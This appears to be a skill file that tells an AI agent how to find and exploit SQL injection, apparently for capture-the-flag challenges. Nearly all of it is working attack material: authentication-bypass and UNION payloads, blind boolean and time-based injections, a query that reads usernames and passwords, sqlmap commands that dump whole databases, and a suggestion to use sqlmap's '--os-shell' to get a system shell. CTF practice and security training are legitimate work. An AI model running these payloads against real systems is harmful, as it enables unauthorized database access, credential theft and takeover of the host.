---
name: sqli
when: a parameter reaches a SQL query (login, search, id=, filters); errors mention SQL
tools: [http_request, shell, python_exec]
phase: exploit
---
# SQL injection

Detect: append `'`, `"`, `')`, ` OR 1=1-- -`; watch for SQL errors, boolean differences, or time delays.
- Auth bypass: `admin'-- -`, `' OR '1'='1'-- -`, `' OR 1=1 LIMIT 1-- -` in username or password.
- Union: find column count with `ORDER BY N` until error, then
  `?id=-1 UNION SELECT 1,2,3-- -` and place output in a reflected column.
- Read data: `UNION SELECT username,password FROM users`; enumerate schema via
  `information_schema.tables` / `columns` (MySQL/Pg) or `sqlite_master` (SQLite).
- Blind boolean: `?id=1 AND SUBSTRING((SELECT flag FROM ...),1,1)='d'` -> compare responses.
- Blind time: `?id=1 AND SLEEP(3)` (MySQL) / `pg_sleep(3)` / `WAITFOR DELAY '0:0:3'` (MSSQL).
Automate once confirmed:
```
sqlmap -u 'http://TARGET/item?id=1' --batch --dbs --threads 4
sqlmap -u 'http://TARGET/item?id=1' --batch -D app -T users --dump
sqlmap -u 'http://TARGET/login' --data 'user=a&pass=b' --batch --level 3 --risk 2
```
Flag often lives in a `flag`/`secret` table/column, or enables login to a page that shows it.
Pitfalls: comment style (`-- -`, `#`, `/**/`); URL-encode; try both GET and POST; sqlmap `--os-shell` if stacked queries + FILE priv.
